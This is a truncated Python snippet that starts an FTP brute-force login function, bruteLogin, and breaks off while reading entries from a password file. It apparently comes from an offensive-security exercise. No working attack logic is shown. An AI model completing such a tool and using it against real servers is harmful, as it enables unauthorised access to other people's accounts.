import ftplib

def bruteLogin(hostname, passwdFile):
    with open (passwdFile, 'r') as pF:
        for line in pF.readlines():
            userName